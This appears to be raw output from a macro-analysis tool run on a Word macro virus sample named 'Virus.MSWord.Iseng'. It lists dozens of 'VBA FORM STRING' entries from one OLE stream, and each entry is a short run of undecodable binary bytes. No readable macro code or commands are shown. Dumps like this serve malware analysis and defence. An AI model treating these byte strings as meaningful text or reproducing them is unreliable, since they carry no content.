VBA FORM STRING IN './Virus.MSWord.Iseng' - OLE stream: 'Macros/Isengf/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���(�Ȥj
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Iseng' - OLE stream: 'Macros/Isengf/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
8l6�h�ixJ�?�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Iseng' - OLE stream: 'Macros/Isengf/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�}i���J��D����hc��
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Iseng' - OLE stream: 'Macros/Isengf/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�	0t@d
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Iseng' - OLE stream: 'Macros/Isengf/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�||}~���
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Iseng' - OLE stream: 'Macros/Isengf/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�����6w
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Iseng' - OLE stream: 'Macros/Isengf/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
e�����������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Iseng' - OLE stream: 'Macros/Isengf/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�����
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Iseng' - OLE stream: 'Macros/Isengf/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
*�yg�~��������������)�f�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Iseng' - OLE stream: 'Macros/Isengf/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
̴�����ӥ������x��ᴀ�к��������N
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Iseng' - OLE stream: 'Macros/Isengf/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
&@�8�3���3N��C�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Iseng' - OLE stream: 'Macros/Isengf/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�)�H��3
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Iseng' - OLE stream: 'Macros/Isengf/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�
&QX)
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Iseng' - OLE stream: 'Macros/Isengf/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�_�c�L�B��>�[���ɏP
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Iseng' - OLE stream: 'Macros/Isengf/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
DC�%ǎ@���
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Iseng' - OLE stream: 'Macros/Isengf/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)R�a�2�]1?

-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Iseng' - OLE stream: 'Macros/Isengf/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����D
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Iseng' - OLE stream: 'Macros/Isengf/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
S��z<�J��*��,�Pڧ+�M/�5�#�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Iseng' - OLE stream: 'Macros/Isengf/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��%�B
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Iseng' - OLE stream: 'Macros/Isengf/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
a�k�?�~�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Iseng' - OLE stream: 'Macros/Isengf/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��٫G1�`k��W?O�NsX�.^wG�.��4�=�����Ѐ�em�z�P�fM��s
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Iseng' - OLE stream: 'Macros/Isengf/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
e����
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Iseng' - OLE stream: 'Macros/Isengf/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
bG3���a��
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Iseng' - OLE stream: 'Macros/Isengf/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
0��Ɂ
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Iseng' - OLE stream: 'Macros/Isengf/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
<�.��
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Iseng' - OLE stream: 'Macros/Isengf/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��˿�"e��
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Iseng' - OLE stream: 'Macros/Isengf/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
|��G@w
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Iseng' - OLE stream: 'Macros/Isengf/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
|��_��U�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Iseng' - OLE stream: 'Macros/Isengf/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�t�-�_}��Ơx
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Iseng' - OLE stream: 'Macros/Isengf/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
s����u
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Iseng' - OLE stream: 'Macros/Isengf/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��ߋ�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Iseng' - OLE stream: 'Macros/Isengf/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
0"�%"x
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Iseng' - OLE stream: 'Macros/Isengf/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
~7b������ޏ�͈�{
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Iseng' - OLE stream: 'Macros/Isengf/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
n�!�-n
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Iseng' - OLE stream: 'Macros/Isengf/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
 ��E9_
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Iseng' - OLE stream: 'Macros/Isengf/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���oE
W�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Iseng' - OLE stream: 'Macros/Isengf/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
:&)�{>
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Iseng' - OLE stream: 'Macros/Isengf/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Ǡ�'2
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Iseng' - OLE stream: 'Macros/Isengf/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
8��֩Gco6
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Iseng' - OLE stream: 'Macros/Isengf/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
~sZy�z1^�݉
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Iseng' - OLE stream: 'Macros/Isengf/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��^��Y#��U1d��f
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Iseng' - OLE stream: 'Macros/Isengf/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���a�]�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Iseng' - OLE stream: 'Macros/Isengf/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�yc�?(
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Iseng' - OLE stream: 'Macros/Isengf/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
`i�=�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Iseng' - OLE stream: 'Macros/Isengf/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�gw9��#wA ����e9kvgRY�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Iseng' - OLE stream: 'Macros/Isengf/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Ȑ��J=�l��
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Iseng' - OLE stream: 'Macros/Isengf/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Am�a\�-
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Iseng' - OLE stream: 'Macros/Isengf/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�`'"
"�h��l���h�k߸�03���
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Iseng' - OLE stream: 'Macros/Isengf/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���(�Ȥj
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Iseng' - OLE stream: 'Macros/Isengf/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
8l6�h�ixJ�?�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Iseng' - OLE stream: 'Macros/Isengf/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�}i3�0�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Iseng' - OLE stream: 'Macros/Isengf/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
	��` �
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Iseng' - OLE stream: 'Macros/Isengf/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�-��!�3:�<,
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Iseng' - OLE stream: 'Macros/Isengf/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
dhgfe~���
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Iseng' - OLE stream: 'Macros/Isengf/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���j
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Iseng' - OLE stream: 'Macros/Isengf/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��yh���e������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Iseng' - OLE stream: 'Macros/Isengf/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����,�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Iseng' - OLE stream: 'Macros/Isengf/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���y��
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Iseng' - OLE stream: 'Macros/Isengf/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������j
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Iseng' - OLE stream: 'Macros/Isengf/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���ڞ+
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Iseng' - OLE stream: 'Macros/Isengf/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�xf�͗�i��ӽ
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Iseng' - OLE stream: 'Macros/Isengf/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
*Ǯ��
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Iseng' - OLE stream: 'Macros/Isengf/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
㵅曹����r�+��
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Iseng' - OLE stream: 'Macros/Isengf/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
2p� ���
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Iseng' - OLE stream: 'Macros/Isengf/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
ھi����&m ������U�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Iseng' - OLE stream: 'Macros/Isengf/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�]c�I�E]
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Iseng' - OLE stream: 'Macros/Isengf/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�`���;4QP�a'u�;a0٫fϞ=p��
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Iseng' - OLE stream: 'Macros/Isengf/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�C
�=̩K�N
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Iseng' - OLE stream: 'Macros/Isengf/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Th��2{E�u�&Sb�P��
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Iseng' - OLE stream: 'Macros/Isengf/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
hP}Fg�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Iseng' - OLE stream: 'Macros/Isengf/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(�¢Z�O�Px�A�E���O
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Iseng' - OLE stream: 'Macros/Isengf/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
 Ԁ���ٗE�)ֺ�f̿H-���l��L1
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Iseng' - OLE stream: 'Macros/Isengf/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
G��0�_��0�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Iseng' - OLE stream: 'Macros/Isengf/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�w��õ�"
�Nr����
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Iseng' - OLE stream: 'Macros/Isengf/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����	^K��a��
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Iseng' - OLE stream: 'Macros/Isengf/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
 �����"�8�!
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Iseng' - OLE stream: 'Macros/Isengf/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Ç���ɓ
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Iseng' - OLE stream: 'Macros/Isengf/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
@�]���
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Iseng' - OLE stream: 'Macros/Isengf/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���A�a�_~ǁw`r
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Iseng' - OLE stream: 'Macros/Isengf/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
v��]
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Iseng' - OLE stream: 'Macros/Isengf/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�G�|��w_��}G�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Iseng' - OLE stream: 'Macros/Isengf/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
^h��)
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Iseng' - OLE stream: 'Macros/Isengf/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
zǟ�&^H`��
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Iseng' - OLE stream: 'Macros/Isengf/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��.�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Iseng' - OLE stream: 'Macros/Isengf/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
H�$�K2�ď��'$�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Iseng' - OLE stream: 'Macros/Isengf/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
&hd�W��e�[��%�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Iseng' - OLE stream: 'Macros/Isengf/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Ni\�W&h
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Iseng' - OLE stream: 'Macros/Isengf/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
VX߀7^	��s6�ew2j���G�)g�O�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Iseng' - OLE stream: 'Macros/Isengf/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
`��f�~
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Iseng' - OLE stream: 'Macros/Isengf/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
pg�⹇h�q:qi}�jZ�z�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Iseng' - OLE stream: 'Macros/Isengf/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
g����������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Iseng' - OLE stream: 'Macros/Isengf/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�iࢮf�d�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Iseng' - OLE stream: 'Macros/Isengf/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
p�ܡ[�+�@�������u�m�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Iseng' - OLE stream: 'Macros/Isengf/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
=]�H��b�J��"
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Iseng' - OLE stream: 'Macros/Isengf/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Ƹ\�y.�J
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Iseng' - OLE stream: 'Macros/Isengf/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�`'"
"�h��l���h�k߸�03���
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Iseng' - OLE stream: 'Macros/Isengf/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���(�Ȥj
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Iseng' - OLE stream: 'Macros/Isengf/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
8l6�h�ixJ�?�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Iseng' - OLE stream: 'Macros/Isengf/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�}i���J�y<"
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Iseng' - OLE stream: 'Macros/Isengf/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
H$"�D(�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Iseng' - OLE stream: 'Macros/Isengf/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���<��7[.��
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Iseng' - OLE stream: 'Macros/Isengf/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
pquwjik�kj~�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Iseng' - OLE stream: 'Macros/Isengf/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�k�����p
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Iseng' - OLE stream: 'Macros/Isengf/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�j�h�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Iseng' - OLE stream: 'Macros/Isengf/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��{��|��l��-�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Iseng' - OLE stream: 'Macros/Isengf/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
~��x���mj�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Iseng' - OLE stream: 'Macros/Isengf/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��îĸ��Ȥ��n�g޵��֓���߇�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Iseng' - OLE stream: 'Macros/Isengf/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
,Կi�֯ƕf{H���&�6
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Iseng' - OLE stream: 'Macros/Isengf/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��}�����F��[�tճ��!D�뎩���
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Iseng' - OLE stream: 'Macros/Isengf/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�7rD�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Iseng' - OLE stream: 'Macros/Isengf/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
XƸ�LfK��c)7Jcy.
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Iseng' - OLE stream: 'Macros/Isengf/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+��ڑ���"1c
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Iseng' - OLE stream: 'Macros/Isengf/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
ܩ\)�a�H����F
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Iseng' - OLE stream: 'Macros/Isengf/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
ܚ�J�6<��U1A�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Iseng' - OLE stream: 'Macros/Isengf/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Z��F긥�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Iseng' - OLE stream: 'Macros/Isengf/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
vp���

-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Iseng' - OLE stream: 'Macros/Isengf/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
т1G�ʹ�iO�0�ΝiH�]��pZ�(�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Iseng' - OLE stream: 'Macros/Isengf/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
0�a�w�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Iseng' - OLE stream: 'Macros/Isengf/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
8{m�8�t���
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Iseng' - OLE stream: 'Macros/Isengf/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Rc@p�@��
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Iseng' - OLE stream: 'Macros/Isengf/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
}���'
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Iseng' - OLE stream: 'Macros/Isengf/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
  ��뿁
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Iseng' - OLE stream: 'Macros/Isengf/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���^.
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Iseng' - OLE stream: 'Macros/Isengf/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��ɕ7
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Iseng' - OLE stream: 'Macros/Isengf/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
}�u��
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Iseng' - OLE stream: 'Macros/Isengf/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����S�B�~=t�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Iseng' - OLE stream: 'Macros/Isengf/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
t�]z�9�܄
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Iseng' - OLE stream: 'Macros/Isengf/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
x�|��Ƅ��Q�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Iseng' - OLE stream: 'Macros/Isengf/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��Yh���
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Iseng' - OLE stream: 'Macros/Isengf/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
4� r�5'!��)�!}
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Iseng' - OLE stream: 'Macros/Isengf/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�� o:����8�%�8�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Iseng' - OLE stream: 'Macros/Isengf/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
ҙ(�*����Uw%�V
-------------------------------------------------------------------------------
